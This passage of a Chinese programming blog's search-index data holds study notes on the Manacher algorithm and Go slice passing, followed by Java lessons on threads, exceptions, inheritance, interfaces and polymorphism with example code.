如何构造？假设当前该设置下标为i的值了，i的左边有一个下标c的，其半径能到达的最右边为当前最大 那么，如果i关于c对称的点在c的半径里面，那么i的半径一定大于等于其对称点的半径，即可以设置为对称点的半径，如果不在，就先假设当前i的半径为0 然后我们再对i加上当前已知i半径的左右比较，如果相等则将T[i]+1，反之就已经找到当前半径最大 构造完之后如下，这里的目标字符串为aba， 比如：我在构造i=4的时候，也就是如下的b点时，当前的中心为a，其a的半径为1，即右边最大可达3，是小于当前b的下标的，所以T[4]=0，然后再向b的左右遍历，直到T[4]=3的时候，不再对称，退出 代码实现： // 获得s的最长回文子串长度 func Manacher(s string) int { str := \"^#\" for _, v := range s { str += string(v) str += \"#\" } str += \"$\" T := make([]int, len(str)) // 保存当前节点的半径长 center := 0 maxRadius := 0 maxLen := 0 for i := 1; i &lt; len(str)-1; i++ { // 在当前最长的范围内 if i &lt; center+maxRadius { // 寻找对称的左边点，但也有可能右边没那么长，所以取最小 T[i] = min(T[center*2-i], center+maxRadius-i) } // 对应右边一个和左边一个比较，因为最后一个一定不匹配，所以这不用担心指针溢出 for str[i+T[i]+1] == str[i-T[i]-1] { T[i]+=1 } // 如果当前的右边的临界比原来的大， if i+T[i] &gt; center+maxRadius { nowLen := maxRadius if nowLen &gt; maxLen { maxLen = nowLen } center = i maxRadius = T[i] } } return maxLen } func min(x, y int) int { if x &lt; y { return x } return y } 时间复杂度：$$O(n^2)$$","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"关于Golang的指针传递","slug":"golangCall","date":"2021-09-20T03:27:53.000Z","updated":"2021-09-27T15:26:20.706Z","comments":true,"path":"2021/09/20/golangcall/","link":"","permalink":"https://github.com/z-anshun/2021/09/20/golangcall/","excerpt":"","text":"首先，我们先来看一段代码 package main import \"fmt\" func main(){ var i []int try(i) fmt.Println(i) //[] } func try(i []int){ i = append(i, 1) } 在这里，理论上来说本应该打印[1]，因为切片为一个指针，在try函数对其进行了append，其本来指向的地址也应该改变。但是，这里却为空 Golang的值传递首先，Go这门语言对参数的传递都是值传递的，也就是说，在传递切片i的时候，函数只是复制了它本身的引用（其本身是个指针），如： package main import \"fmt\" func main(){ var i []int=[]int{0} try(i) fmt.Printf(\"%p\\n\",&amp;i[0]) // 0xc00000a0b0 fmt.Printf(\"%p\\n\",&amp;i) // 0xc0000044a0 } func try(i []int){ fmt.Printf(\"%p\\n\",&amp;i[0]) // 0xc00000a0b0 fmt.Printf(\"%p\\n\",&amp;i) // 0xc0000044c0 } 这里你就可能明白了，对切片的传递，其实是传递的引用，也就相当于新建一个指针，进而指向该切片。 但是，既然都指向了该切片了，理论上append该切片的话，也应该能打印出来，而一开头代码却无法打印，我们接着往下看 切片的特性老规矩，先看一段代码 package main import \"fmt\" func main() { i:=[]int{1} try(i) } func try(i []int) { fmt.Printf(\"%p\\n\", &amp;i[0]) // 0xc00000a0b0 i = append(i, 1) fmt.Printf(\"%p\\n\", &amp;i[0]) // 0xc00000a0e0 } 很明显。如果了解切片特性的人就知道，在GO的切片容量不足时，对其进行append，会新开辟一片空间，进而复制原来的新加入的，再由append返回地址。 这也就是为什么一开头的代码无法打印出新加入值的原因。 那么，我们给初始化的切片足够容量，是不是就可以打印了？ func main() { i:=make([]int,1,2) try(i) fmt.Println(i) // [0] fmt.Printf(\"%p\\n\",&amp;i[0]) // 0xc00000a0b0 } func try(i []int) { i = append(i, 1) fmt.Println(i) // [0,1] fmt.Printf(\"%p\\n\",&amp;i[0]) // 0xc00000a0b0 } 很明显，虽然两个切片头的地址都一样，但还是打印不了， 对于这一点，我们得知道切片在GO代码中的是如何定义的 type slice struct { array unsafe.Pointer len int cap int } 我们前面说了GO是指传递的，也就是说，虽然函数中的切片指向的是源切片，但是它的len和cap却是一个值，换句话说，我虽然append了原切片，但是在主函数中的len和cap却没有改变，改变的只是原函数中的。 因此，我们要想获取函数中添加的1，也不是不可以 func main() { i:=make([]int,1,2) try(i) ptr:=uintptr(unsafe.Pointer(&amp;i[0])) fmt.Println(*(*int)(unsafe.Pointer(ptr + 8))) // 1 } func try(i []int) { i = append(i, 1) } 这里，我们将切片的第一个元素的指针往后移8字节，就找到新添加的了。 总结Go对于切片的操作虽然是传递的引用，但由于切片的特性，若在传递的函数中对其添加操作，其原函数中的切片是无法察觉的。因此我们尽量避免对切片参数进行添加这种情况。","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://github.com/z-anshun/tags/Golang/"}]},{"title":"JAVA学习第六天","slug":"day06","date":"2021-03-02T13:16:00.000Z","updated":"2021-03-02T13:17:10.741Z","comments":true,"path":"2021/03/02/day06/","link":"","permalink":"https://github.com/z-anshun/2021/03/02/day06/","excerpt":"","text":"包及访问控制权限打包语法 1package 包名 编译语法 javac -d . PackageDemo01.java -d:表示生成目录，目录以package的定义为准 .：表示在当前所在的文件夹下生成 导入 import语法 12import 包.*; // 直接导入import static 包.类.* // 静态导入 访问权限 private：私有访问权限，只能在本类中进行访问 default：默认访问权限，可在本包中进行访问 protected：保护访问权限，只能被本包和不同包的子类访问 public：公开访问权限，所以类中，均可访问 protected举例，即子类的均可访问 12345package test.fun;public class fun { protected String Fun = \"123\";} 123456789101112131415package test.fun2;import test.fun.fun;class Fun extends fun{ public String Say(){ return Fun; }}public class fun2 { public static void main(String args[]){ System.out.println(new Fun().Say()); }} 命名规范再次重提，回顾前面 类：单词首字母大写 方法：第一个单词小写，之后的每个单词都大写，如getInfo() 属性：跟方法一样，如：studentName 包：所有单词均小写 常量：所以单词字面均大写 进程与线程进程一个程序执行的动态过程，其包含一个或多个线程，数据不共享，至少包含初始态、执行态、等待状态、就绪状态和终止状态5个 线程cpu调用和分配的最小单位，其数据可共享 Java实现线程语法 12345678class 类名 extends Thread{ 属性...; 方法...; // 实现抽象方法 public void run(){ 线程主体; }} 例子 1234567891011121314151617public class fun2 { public static void main(String args[]){ System.out.println(new Fun().Say()); ThreadOne t1=new ThreadOne(); t1.start(); // 虽然这里是start，代表启动线程，但实际调用的还是run ThreadOne t2=new ThreadOne(); t2.start(); }}class ThreadOne extends Thread{ public void run(){ for (int i=0;i&lt;10;i++){ System.out.println(i); } }} 为什么只调用start方法启动协程，而不使用run？ 我们先来看一下源码 12345678910public synchronized void start() { ... if (threadStatus != 0) throw new IllegalThreadStateException(); ... start0(); .... private native void start0(); ...} 首先，一个线程对象肯定只能启动一次线程，这里的native表示调用的本机操作系统的函数，即用操作系统来对线程进行管理 Runnable通过实现Runnable接口实现多线程 格式 12345678class ThreadTwo implements Runnable{ 属性...; 方法...; @Override public void run() { 线程主体; }} 举例，因为Runnable接口并没有实现start()方法，所以我们不能直接调用其对象，只能通过public Thread(Runnable target)和public Thread(Runnable target,String name)的两个构造函数实现 123456789101112131415161718192021public class fun2 { public static void main(String args[]){ ThreadTwo r1=new ThreadTwo(); ThreadTwo r2=new ThreadTwo(); Thread t1=new Thread(r1); Thread t2=new Thread(r2); t1.start(); t2.start(); }}class ThreadTwo implements Runnable{ @Override public void run() { for (int i=0;i&lt;10;i++){ System.out.println(i); } }} Runnable接口和Thread类的区别首先，我们先来看一段代码 1234567891011121314151617public class fun2 { public static void main(String args[]){ ThreadOne t1=new ThreadOne(); t1.start(); ThreadOne t2=new ThreadOne(); t2.start(); }}class ThreadOne extends Thread{ public int ticket =5; public void run(){ for (int i=0;i&lt;5;i++){ System.out.println(ticket--); } }} 输出 123456789105432154321 很明显，这里虽然启动了两个线程，但却没有达到资源共享的目的， 解释，继承实际上是是重写了 run() 方法，由于线程的资源和 Thread 实例捆绑在一起，所以不同的线程的资源不会进行共享。 123456789101112131415161718192021222324public class fun2 { public static void main(String args[]){ ThreadTwo r1=new ThreadTwo(); Thread t1=new Thread(r1); Thread t2=new Thread(r1); t1.start(); t2.start(); }}class ThreadTwo implements Runnable{ public int ticket=5; @Override public void run() { for (int i=0;i&lt;10;i++){ if(ticket&gt;0){ System.out.println(ticket--); } } }} 其实这里也不难理解，因为本质上调用的都是同一个继承的对象。这种实现方式就是静态代理的方式，线程资源与 Runable 实例捆绑在一起，Thread 只是作为一个代理类，所以资源可以进行共享 因此，我们一般使用实现Runnable的接口来实现线程的调用 这样做的优势有： 实现 Runnable 大多数情况下是比继承 Thread 更好的方法。 Java 只支持单继承，所以你继承了 Thread 的话，其他的类你就不能继承了。 如果实现 Runnable 接口，多线程可以直接将你的工作并发处理（直接使用 start）。而继承 Thread 不能直接进行多线程工作，你得为你的每一部分工作都定义一个线程。 其他的一些API，接口都是 Runnable 类型的。比如 Java 内置的线程池 API ExcutorService 等。 其实 Thread 只是实现 Runnable 接口，并增加了一些常用方法而已 解释，为什么说单继承的局限性？ 因为继承Thread，我们相当于只是继承了Thread，没有实现Runnable的多线程功能，也就是现在是确保每部分工作都在一个独立的线程，即你对一个对象调用两次start是错误的 线程状态线程分为，创建、就绪、运行、堵塞和死亡5个状态 创建：即new Thread 就绪：当我们调用start()方法时，该线程就会进行就绪状态，遵循CPU的调度 运行：当就绪状态的线程被调度并获取到处理器资源时，此时便会调用该线程对象的run()方法 阻塞：调用sleep()、wait()、suspend()等方法时，线程便会被阻塞，即无法进入排队队列 死亡：即调用结束或者调用stop()方法终止了进程 Thread类的主要方法 方法名 类型 描述 public Thread(Runnable target) 构造 接收Runnable接口的子类对象，实例化Thread对象 public Thread(Runnable target,String name) 构造 与上一个相同，只是会增加一个线程名 public Thread(String name) 构造 返回Thread对象，并设置线程名 public static Thread currentThread() 普通 返回正在执行的线程 public final int getPriorit() 普通 返回线程的优先级 public final String getName() 普通 返回线程名 public boolean isInterrupted() 普通 判断线程是否中断 public final boolean isAlive() 普通 判断线程是否在活动 public final void join() throws InterruptdException 普通 等待线程死亡，即强制运行，其它线程均等待 public final synchronized void join(long millis) throws InterruptdException 普通 等待millis毫秒后，线程死亡 public void run() 普通 执行线程 public final void setName(String name) 普通 设定线程名 public final void setPriority(int newPriority) 普通 设定线程的优先级 public static void sleep(long millis) throws InterruptdException 普通 使当前执行的线程休眠millis毫秒 public void start() 普通 开始执行线程 public String toString() 普通 返回代表线程的字符串 public static void yield() 普通 停止当前正在执行的线程，允许其它线程运行 public final void setDaemon(boolean on) 普通 将一个线程设置为后台运行 线程默认名字为 Thread-XX(如：Thread-1) sleepinterrupt方法可终止所有线程，即使该线程处于堵塞状态 1234567891011121314151617181920212223242526272829class MyThread implements Runnable { @Override public void run() { System.out.println(\"1.进入了run方法\"); try { Thread.sleep(10000); System.out.println(\"2.休眠完成\"); } catch (Exception e) { System.out.println(\"3.休眠终止:\" + e.toString()); return; } System.out.println(\"4.正常结束\"); }}public class fun2 { public static void main(String args[]) { MyThread mt = new MyThread(); Thread t = new Thread(mt, \"线程\"); t.start(); try { Thread.sleep(2000); } catch (Exception e) { System.out.println(e); } t.interrupt(); // 中断所有线程 }} 输出 121.进入了run方法3.休眠终止:java.lang.InterruptedException: sleep interrupted setDaemon1234567891011121314151617class MyThreadTwo implements Runnable{ @Override public void run() { while(true){ System.out.println(\"当前正在运行:\"+Thread.currentThread().getName()); } }}public class fun2 { MyThreadTwo my=new MyThreadTwo(); Thread t=new Thread(my,\"线程\"); t.setDaemon(true); t.start(); }} 上述代码并不会陷入死循环，因为该线程设置了后台运行 设置为守护线程： 优先级低 不能操作文件、数据库等资源，避免主线程关闭而未能关闭守护线程的资源 它会在任何时候甚至在一个操作的中间发生中断 主线程关闭后无需手动关闭守护线程，因为会自动关闭 Java垃圾回收线程就是一个典型的守护线程， 也可以理解为所有为线程服务而不涉及资源的线程都能设置为守护线程 setPriority设置优先级，决定哪个线程会被优先执行 123public static final int MIN_PRIORITY = 1;public static final int NORM_PRIORITY = 5;public static final int MAX_PRIORITY = 10; 但这里，并非哪个线程的优先级越高，就会被越先执行，而最终仍是由CPU的调度决定的。（主方法的优先级是5，属于中等级别） yield线程的礼让 12345678910111213141516171819202122class TestYield implements Runnable { @Override public void run() { for (int i = 0; i &lt; 5; i++) { System.out.println(Thread.currentThread().getName() + \"运行--&gt;\" + i); if (i == 3) { System.out.print(\"线程礼让\"); Thread.currentThread().yield(); } } }}public class fun2 { public static void main(String args[]) { TestYield y = new TestYield(); Thread t1 = new Thread(y, \"线程A\"); Thread t2 = new Thread(y, \"线程B\"); t1.start(); t2.start(); }} 实际即停下当前的线程，区执行其它线程 this与Thread.currentThread的区别首先，我们先来一段代码 123456789101112131415161718192021222324252627class MyThread extends Thread { public MyThread() { System.out.println(\"当前线程的名字：\" + Thread.currentThread().getName()); System.out.println(\"当前线程的名字：\" + this.getName()); } @Override public void run() { System.out.println(\"当前线程的名字：\" + Thread.currentThread().getName() + \" run==\" + Thread.currentThread().isAlive()); System.out.println(\"当前线程的名字：\" + this.getName() + \" run==\" + this.isAlive()); }}//启动类public class fun { protected String Fun = \"123\"; public static void main(String[] args) { MyThread myThread = new MyThread(); //初始化Thread对象，方便调用start(); //此时myThread作为参数传入Thread中，其实是myThread委托thread去执行； Thread thread = new Thread(myThread); //初始化自定义线程名称 thread.setName(\"C\"); //启动线程 thread.start(); }} 输出 1234当前线程的名字：main当前线程的名字：Thread-0当前线程的名字：C run==true当前线程的名字：Thread-0 run==false 解释，因为this是这个对象，而我们在构造一个Thread对象时会调用该条代码this(null, target, \"Thread-\" + nextThreadNum(), 0);，即当前线程对象默认的名字为Thread-XX，而Thread.currentThread会表示当前代码段正在被哪个线程调用的相关信息 补充补充：Java中的线程都是同时启动的，具体看谁先抢到了CPU的资源。另外，主方法其实也是一个线程，所以每次运行Java程序会至少启动两个线程（一个main，一个垃圾回收） 注意:虽然golang里也有主协程，但主协程结束，其它协程也会结束。而Java的主线程结束，并不会影响到其它线程 如： 123456789101112131415161718192021222324252627class MyThread implements Runnable { @Override public void run() { for (int i = 0; i &lt; 50; i++) { System.out.println(Thread.currentThread().getName() + \"--&gt;\" + i); } }}public class fun2 { public static void main(String args[]) { MyThread mt=new MyThread(); Thread t=new Thread(mt,\"线程\"); t.start(); for(int i=0;i&lt;50;i++){ if(i&gt;10){ try{ t.join(); }catch (Exception e){ e.printStackTrace(); } } System.out.println(\"Main 线程运行\"+\"--&gt;\"+i); } }} 同步解决数据共享带来的数据冲突 同步代码块规范 123synchronized(同步对象){ 相应的代码} 举例 1234567891011121314151617181920class MyThread implements Runnable{ private int ticket=5; public void run(){ for(int i=0;i&lt;100;i++){ synchronized (this){ if(ticket&gt;0){ System.out.println(\"买票\"+ticket--); } } } }}public class sync { public static void main(String args[]){ MyThread my=new MyThread(); new Thread(my).start(); new Thread(my).start(); }} 同步方法规范 123synchronized 方法的返回值 funName(params){} 例子 123456789101112131415161718192021222324class MyThread2 implements Runnable { private int ticket = 5; @Override public void run() { for (int i = 0; i &lt; 100; i++) { this.sale(); } } public synchronized void sale() { if (ticket &gt; 0) { System.out.println(\"买票\" + ticket--); } }}public class sync { public static void main(String args[]) { MyThread2 my = new MyThread2(); new Thread(my).start(); new Thread(my).start(); }} 死锁当两个或多个对象，都在彼此等待对方执行完成时，这样就会形成死锁，使程序无法再执行下去 总结 打包使用package，import则为导入包 命名规范的问题，就只有类名需要每个单词均大写 Java中的线程实现可以使用Thread继承，也可以使用Runnable接口实现，但由于单继承的局限，所以继承Thread对象的线程是无法实现多线程的 Thread类的主要方法 this代表当前的线程对象，Thread.currentThread表示当前的线程调用的相关信息 对方法定义的完整格式：[public | default | protected | private] [final] [static] [synchronized ] [返回类型 | void] 方法名(参数) throws Exception1,Exception2{ return 返回值} 死锁","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"JAVA学习第五天","slug":"day05","date":"2021-03-02T13:15:56.000Z","updated":"2021-03-02T13:16:58.557Z","comments":true,"path":"2021/03/02/day05/","link":"","permalink":"https://github.com/z-anshun/2021/03/02/day05/","excerpt":"","text":"异常try-catch类似于if-else 语法： 12345678910111213try{ // 可能有错误的语句}catch(异常类 异常对象){ // 对应的处理语句}catch(异常类 异常对象){ }catch(异常类 异常对象){ }...// 下面的finally可省略finally{ // 一定会运行的代码} 如： 12345678910111213141516171819public class main { public static void main(String args[]){// System.out.println(\"hello Java!\"); int y=10; int x=0; try{ int tmp=y/x; System.out.println(tmp); }catch (AbstractMethodError e){ System.out.println(\"Error:\"+e); }catch (Error e){ System.out.println(\"Error:\"+e); } finally { System.out.println(\"test\"); } System.out.println(\"over\"); }} 输出 123Error:java.lang.ArithmeticException: / by zerotestover 这里注意： catch必须对应错 finally一定会执行（如果catch没有捕获到该错误，就会在执行一次finally后退出） try和catch中都有return，而finally只是将值保存起来，换句话说，要return的值，是不会在finally中改变的，因此，应避免在finally中使用return 常见的几个错误： 数组超出绑定异常：ArrayIndexOutBoundsException 数据格式化错误：NumberFormatException 算术异常：ArithmeticException Exception和ErrorException(例外)和Error(错误)均属于Throwable的子类，而 Exception一般表示程序中出现的问题，可以使用try…catch进行处理； Error一般是指JVM错误，无法在程序中进行处理，即不需要程序处理。 Exception属于一个异常类，而上述的算术异常、格式化错误等都属于它的子类，其具有printStackTrace()的方法打印更加详细的异常信息 为什么不用Throwable而用Exception？ 这是因为Throwable包括了Err和Exception，使用Exception更能表示程序内部的错误，更加严谨 Throws用法 123public 类型 funcName(Params)throws Exception{} 如果有对象调用这个方法，就必须使用try，catch捕获，除非它也使了throws 如 12345678910111213141516171819class Math { public int div(int i, int j) throws Exception { int temp = i / j; return temp; }}public class main { public static void main(String args[]) { Math m = new Math(); // 下面必须捕获错误 try { System.out.println(m.div(10, 2)); } catch (Exception e) { e.prjavaintStackTrace(); } }} 或者 1234567public class main { public static void main(String args[])throws Exception{ Math m = new Math(); // 这里就不必捕获，错误交给了JVM System.out.println(m.div(10, 2)); }} Throw1234567public static void main(String args[])throws Exception{ try{ throw new Exception(\"my error\"); }catch(Exception e){ e.printStackTrace(); }} 自动抛出一个Exception，然后被捕获 一般情况下，throws和throw是配合使用的 如 12345678910111213class Math { public int div(int i, int j) throws Exception { int temp; try { temp = i / j; } catch (Exception e) {// 捕获异常 throw e;// 交给被调用处 处理 } finally { System.out.println(\"计算结束\"); } return temp; }} throws负责告诉上一级捕获错误，throw抛出错误 自定义错误12345class MyException extends Exception { public MyException(String msg) { super(msg); // 使用父亲的方法 }} 断言用法 12assert boolean表达式 ;assert boolean表达式 : 详细的信息 很明显，如果返回的结果为true，就不会提示任何错误信息；若结果为false，则按定义的错误进行返回，没有就使用默认的错误提示 如： 123456class Test{ public static void main(){ int []x ={1,2,3}; assert x.length==0:\"数组长不为0\"; }} 注意：1. 断言无法作为判断语句来使用 断言更多适用于测试环境，在开发中几乎不使用 总结 Java中使用try catch进行错误的捕获 finally一定执行，但是是在return之后（类似于golang的defer） throws表示该方法调用时需捕获错误，throw表示抛出错误 断言，JDK1.4之后的新功能，多用于测试环境。 异常的捕获，是因为在发生异常后，JVM会自动的产生一个错误实例，并去匹配响应的catch，查找错误。 异常的最大父级时Throwable，其拥有两个直系子类Exception（程序错误异常）和Error（JVM异常）","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"JAVA学习第四天","slug":"day04","date":"2021-02-09T12:52:11.000Z","updated":"2021-02-09T12:52:40.058Z","comments":true,"path":"2021/02/09/day04/","link":"","permalink":"https://github.com/z-anshun/2021/02/09/day04/","excerpt":"","text":"适配器的设计为什么需要这个? 我们先假设一下，如果一个接口定义了许多抽象方法，那么即便我们需要实现这个接口，也不一定需要其中的全部方法，就会造成麻烦。 怎么解决？我们可以用一个抽象类来实现这个接口，里面的方法都为空，再用对应的对象来继承，覆盖。 如： 12345678910111213141516171819202122interface Window { void open();// 打开 void close();// 关闭 void activated();// 窗口活动 void iconified();// 窗口最小化 void deiconified();// 窗口恢复默认大小}// 声明一个抽象类做适配器abstract class WindowAdapter implements Window { public void open() {} public void close() {} public void activated() {} public void iconified() {} public void deiconified() {}}class WindowImpl extends WindowAdapter{ public void open(){ System.out.println(\"窗口打开\"); }} 如上，虽然Window接口规范了很多方法，但是充当适配器的类使WindowImpl只实现了对应的方法 类的内部扩展类里面也可声明接口 如： 1234567891011121314151617181920212223242526abstract class A { public abstract void printA(); interface B { void printB(); }}class X extends A { public void printA() { System.out.println(\"printA\"); } class Y implements B { public void printB() { System.out.println(\"printB\"); } }}public class main { public static void main(String args[]) { A.B b = new X().new Y(); b.printB(); }} 上面的调用很帅，只能匿名构造X再构造Y（new X().new Y()，当然，也可一步一步的来） 抽象类与接口的区别 区别点 抽象类（abstract） 接口（interface） 定义 至少包含一个抽象方法的类 由抽象方法和全局常量（public static final）组成 使用 extends implements 关系 抽象类可实现多个接口 接口不能继承抽象类，但允许继承多个接口 常见设计模式 模板设计 工厂设计，代理设计 局限 单类继承的局限 无 实际 一个模板 一个标准或表示一种能力 这里要注意的是，一个类尽量去避免继承一个已经实现好了的类。若抽象类与接口都可使用，则优先使用接口 Object类所以类的公共父类，即 class Person{}等同于class Person extends Object{} Object类也叫做普通类（跟js中的类似） Object的主要方法： public Object()：构造方法 public boolean equals(Object obj)：对象比较，默认的比较地址，若需比较值，则需覆盖 public int hashCode()：hash转码 public String toString()：用于打印对象的字符串化 对此，我们可以覆写Object的方法，比如，因为在打印时会自动调用toString打印地址，我们就可覆写，从而实现我们自己想要的打印方式 如: 1234567891011121314class Person { @Override public String toString() { System.out.println(super.toString());// Person@18769467 return \"Name+age\"; }}public class main { public static void main(String args[]) { Person p = new Person(); System.out.println(p);// Name+age }} 包装类将基本数据类作为对象处理，即进行包装，分别为：Integer、Character、Short、Long、Float、Double、Boolean、Byte 其中，Charater和Boolean属于Object的直接子类，而其它都是属于Number类的子类（Number类具有之间互相转换的方法） 拆箱与装箱如字面意思一样，拆箱即一个包装类变为基本数据类型，而装箱就是把一个基本数据类型变为包装类 如： 123int i=10;Integer integer=(Integer) i;// 装箱int temp=integer.intValue();// 拆箱 当然，自动装箱、拆箱也可 12Integer i = 10;// 自动装箱int temp = i;// 自动拆箱 匿名类1234567891011121314151617181920abstract class A extends Object { public abstract void printA(); interface B { void printB(); }}class T{ public void fun1(){ this.fun2(new A.B(){ public void printB() { System.out.println(\"匿名类\"); } }); } public void fun2(A.B b){ }} 跟匿名对象类似，直接内部实现接口，即匿名类（实现了对应的方法）。可以避免因为只使用一次接口而创建类的繁琐 总结： 适配器的设计，就是提高接口的灵活性 类的内部扩展，即接口与类的相互使用 普通类，即Object类，一切类的父类，实现了toString,equals和hashCode等方法 包装类，为了实现Java的一切皆对象的宗旨 匿名类，类似于匿名对象，再构造接口时，直接实现其方法","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"JAVA学习第三天","slug":"day03","date":"2021-02-07T16:22:12.000Z","updated":"2021-02-07T16:22:58.148Z","comments":true,"path":"2021/02/08/day03/","link":"","permalink":"https://github.com/z-anshun/2021/02/08/day03/","excerpt":"","text":"面向对象（高级）继承语法： 123class 子类 extends 父类{ } 例： 12345class Student extends Person{ public Student(){ super(); // 调用父级的构造函数，当构造函数的参数为空时可省略 }} 换句话说，Student可以看作Person的扩充，也就是继承了Person的属性和方法，并且可添加属于自己的 并且，Java允许多类继承，但不能继承多类，即：一个儿子只能有一个父亲，而一个父亲可以有多个儿子。 注意：子类不能调用父类的私有成员和方法。并且，在构造子类时，会先构造其父类 覆盖当父级和子级有同一个名称的方法时，会优先调用子级的 1234567891011121314151617181920212223242526272829class Per { private String name; private int age; public Per(String s) { System.out.println(\"test\"); } void print() { System.out.println(\"This is print by Per\"); }}class Student extends Per { public Student() { super(\"\"); // 这里可以看作声明了一个父级对象(即可以调用父级的函数) } void print() { super().print(); // This is print by Per System.out.println(\"This is print by Student\"); }}public class main{ public static void main(String args[]){ Student s=new Student; s.print();// This is print by Student }} 这里要提示一点，对于同名的方法，子级的权限需要大于等于父级 如，下面就错误的写法 1234567891011121314// 权限: private&lt;default&lt;publicclass Per { ... public void print() { System.out.println(\"This is print by Per\"); }}class Student extends Per { ... void print() { System.out.println(\"This is print by Student\"); }} 注意，方法的复写，一定是同等级的，如下： 1234567891011121314151617181920212223242526272829303132333435class Per { private String name; private int age; private void print() { System.out.println(\"This is print by Per\"); } public void fun(){ this.print();// This is print by Per this.print1();// This is print1 by Student } void print1(){ System.out.println(\"This is print1 by Per\"); }}class Student extends Per { public Student() { super(); } void print() { System.out.println(\"This is print by Student\"); } void print1(){ System.out.println(\"This is print1 by Student\"); }}class public main{ public static void main(){ Student s=new Student(); s.fun(); }} 分析：因为Per的print权限低于Student所以并没有被覆盖，在当前就寻找Per的方法(可以看作js的属性链,即就近选择原则) super和this的区别 区别点 this super 属性访问 访问本类中的属性，如果没有，就从父类中继续寻找 访问父类的属性 方法 访问本类的方法，如果没有，就从父类中去寻找 直接访问父类的方法 调用构造 调用本类的构造，必须放在首行 调用父类的构造，必须放在子类首行 特殊 表示当前对象 无此概念 final可用于声明类，属性和方法 有下面几点需要注意： final声明的类不能拥有子类 声明的方法不能被子类覆写 声明的变量即常量。即对变量用final声明时，等价于const 如下，B类复写了A的使用final声明的方法 1234567891011class A{ final void print(){ }}class B extends A{ void print(){ }} 抽象类抽象类，就类似于模板的作用。我们使用abstract来声明该类或方法为抽象类 使用规则如下： 包含一个抽象方法的类必须是抽象类 需用abstract来进行声明 抽象方法只需声明，而不必被实现 抽象类必须被继承，并且，若子类不是抽象类的话，需将抽象类的抽象方法全部覆盖 使用规范： 123456789abstract class 抽象类名{ 属性; // 普通方法 访问权限 返回类型 方法名(参数){ } // 抽象方法 访问权限 abstract 返回类型 方法名(参数); // 这里不需要实现} 例子： 12345678910111213abstract class A { public static final String name = \"as\"; public abstract void print();}class B extends A { // 这里的权限要跟上面一样 public void print() { System.out.println(this.name); }} 注意，因为抽象化的方法是允许子类覆写的，所以一个抽象类不能使用final和private声明抽象方法的 实际上抽象类，也只是比普通类多了一个抽象类的方法，其它就没有什么特别的了 接口一种特殊的类，由全局常量和公共的抽象方法组合而成 格式： 12345678910interface 接口名{ 全局常量; 抽象方法;// 这里的抽象方法必须是public权限才行。并且，即使你不写这里也默认就是public}//调用class 类名 implements 接口名1,接口名2...{ 实现对应的方法} 如： 123456789101112interface C { // 下面的声明都是简写 String name = \"as\";// public static final String name=\"as\"; void print();// public abstract void print();}class D implements C { public void print() { System.out.println(this.name); }} 注意：接口可以被实施多个，并且抽象类与接口之间可以相互继承（因为接口也是一种类） 多态性Java在面向对象时，其多态性主要有下面两种方式体现： 方法的重载和重写（覆盖） 对象的多态性 而对象的多态性主要是：向上转型（父类继承子类）和向下转型（子类继承父类） 如;向上转型（子类 -&gt; 父类）: 1234567891011121314151617181920212223242526272829class E{ public void fun1(){ System.out.println(\"E的fun1\"); } public void fun2(){ this.fun1(); }}class F extends E{ @Override public void fun1() { System.out.println(\"F的fun1\"); } public void fun3(){ System.out.println(\"This is fun3\"); }}public class main { public static void main(String args[]) { F f = new F(); E e=new E(); e.fun2();// E的fun1 e=f; e.fun2();// F的fun1 e.fun1();// F的fun1 }} 这里是因为父类的方法被子类覆盖，然后父类对象指向了子类对象，即对应的父类被子类覆盖了，完成了向上转型 注意：F f=(F)e或F f = new F();f=e;这样的强制转型是不行的，即父类强制转换为子类，因为子类永远的方法，父类不一定拥有(即父亲可以代替儿子，儿子不能代替父亲) 错误例子： 1234567public class main { public static void main(String args[]) { E e=new E(); F f = (F)e; f.fun1(); }} 那么怎么解决呢？使用方法的重载 如： 123456public static void fun(E e){ e.fun1();}public static void fun(F f){ f.fun1();} instanceofinstanceof，如字面意思一样，判断这个对象是那个类的实例 使用例子： 1234567891011121314public class main { public static void main(String args[]) { E e1 = new F(); boolean b1 = e1 instanceof E; boolean b2 = e1 instanceof F; System.out.println(b1);// true System.out.println(b2);// true E e2 = new E(); boolean b3 = e2 instanceof E; boolean b4 = e2 instanceof F; System.out.println(b3);// true System.out.println(b4);// false }} 解析：父类可以变成子类，即可以向上或向下转型，但如果直接使用了父类实例化就不能再转换了 使用地方，父类做参数，判断属于哪个子类（即使，若A有B、C两个子类，就可判断） 补充: 1234F f1=new F();E e = f1;F f=(F)e;f.fun1(); 这样是允许的，所以可以将子类做参数再传递（其实链式理解也能相当，因为构造函数是从最高级开始，若前面没构造，理所当然不能强制转换） 注意：子类因为实现父类的，所以子类可以赋值给父类（这里的父类包括接口，抽象类等） 总结 继承，覆盖等都是子级对父级的 super是在子级里调用父级，跟this差不多，都会指向一个构造函数 final如果对变量声明就等同于const，对方法和类，都会使其不具有继承效果 抽象类（abstract）相当于子级必须实现的方法 接口（interface），类似于golang的接口，相当于一个模板 多态，子级能赋值给父级，而父级不能赋值给子级（因为父级并没有实现子级的模板，如果实现了，一样可以，即该父级也是由子级得来的） 